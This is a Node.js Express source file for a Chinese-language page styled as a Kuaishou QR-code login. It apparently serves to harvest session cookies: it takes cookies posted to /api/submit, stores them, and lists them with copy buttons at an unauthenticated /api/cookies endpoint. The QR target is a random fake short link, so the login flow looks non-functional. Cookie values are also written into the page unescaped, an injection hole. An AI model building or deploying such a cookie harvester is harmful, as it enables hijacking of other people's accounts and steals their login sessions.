const express = require("express");
const crypto = require("crypto");
const path = require("path");
const app = express();

app.use(express.json());

const cookies = [];
const qrMap = {};

// ========== 首页 ==========
app.get("/", (req, res) => {
    res.send(`<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>快手扫码</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#111;color:#fff;font-family:Arial;padding:20px;text-align:center}
h2{color:#ff4900;margin-bottom:20px}
.tabs{display:flex;justify-content:center;gap:10px;margin-bottom:20px}
.tabs button{padding:10px 24px;border:none;border-radius:6px;font-size:14px;cursor:pointer;background:#333;color:#fff}
.tabs button.active{background:#ff4900}
.page{display:none}
.page.active{display:block}
#qrcode{margin:20px auto;display:inline-block;background:#fff;padding:10px;border-radius:8px}
#status{margin-top:15px;font-size:16px}
.success{color:#00ff88}
.cookie-item{background:#1a1a1a;padding:12px;margin-bottom:10px;border-radius:8px;border-left:3px solid #ff4900;text-align:left}
.cookie-item p{font-size:11px;color:#aaa;word-break:break-all;margin-top:5px}
.cookie-item .t{font-size:11px;color:#666}
.copy-btn{background:#ff4900;color:#fff;border:none;padding:4px 10px;border-radius:4px;cursor:pointer;font-size:11px;margin-top:5px}
</style>
</head>
<body>
<h2>快手扫码登录</h2>
<div class="tabs">
    <button class="active" onclick="showPage('scan')">扫码登录</button>
    <button onclick="showPage('list');loadCookies()">Cookie列表</button>
</div>
<div id="scanPage" class="page active">
    <div id="qrcode"></div>
    <p id="status">⏳ 加载中...</p>
</div>
<div id="listPage" class="page">
    <div id="cookieList">点击Cookie列表加载</div>
</div>
<script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
<script>
function showPage(name){
    document.querySelectorAll(".page").forEach(p=>p.classList.remove("active"));
    document.getElementById(name+"Page").classList.add("active");
    document.querySelectorAll(".tabs button").forEach((b,i)=>{
        b.classList.toggle("active",(name==="scan"&&i===0)||(name==="list"&&i===1));
    });
}
async function init(){
    const res=await fetch("/api/qr");
    const data=await res.json();
    new QRCode(document.getElementById("qrcode"),{text:data.qrUrl,width:280,height:280});
    document.getElementById("status").textContent="请用快手APP扫描二维码";
    poll(data.qrId);
}
async function poll(qrId){
    while(true){
        try{
            const res=await fetch("/api/check?id="+qrId);
            const data=await res.json();
            if(data.status==="ok"){
                document.getElementById("status").innerHTML='<span class="success">已扫码，等待获取Cookie...</span>';
                if(data.cookie){
                    document.getElementById("status").innerHTML='<span class="success">登录成功！</span>';
                    break;
                }
            }
        }catch(e){}
        await new Promise(r=>setTimeout(r,3000));
    }
}
async function loadCookies(){
    const res=await fetch("/api/cookies");
    const data=await res.json();
    document.getElementById("cookieList").innerHTML=data.length===0?"暂无数据":data.map(c=>
        '<div class="cookie-item"><span class="t">'+c.time+'</span><p>'+c.cookie+'</p><button class="copy-btn" onclick="copyText(\''+c.cookie.replace(/'/g,"\\'")+'\')">复制</button></div>'
    ).join("");
}
function copyText(text){
    navigator.clipboard.writeText(text);
    alert("已复制");
}
init();
</script>
</body>
</html>`);
});

// ========== API ==========
app.get("/api/qr", (req, res) => {
    const qrId = crypto.randomUUID();
    const qrUrl = "https://v.kuaishou.com/" + crypto.randomBytes(4).toString("hex");
    qrMap[qrId] = { status: "wait", cookie: null };
    res.json({ qrId, qrUrl });
});

app.post("/api/submit", (req, res) => {
    const { qrId, cookie } = req.body;
    if (qrMap[qrId]) {
        qrMap[qrId] = { status: "ok", cookie };
        cookies.push({ cookie, time: new Date().toISOString() });
    }
    res.json({ ok: true });
});

app.get("/api/check", (req, res) => {
    const data = qrMap[req.query.id];
    if (!data) return res.json({ status: "wait", cookie: null });
    res.json(data);
});

app.get("/api/cookies", (req, res) => {
    res.json(cookies.slice(-50).reverse());
});

app.listen(process.env.PORT || 3000);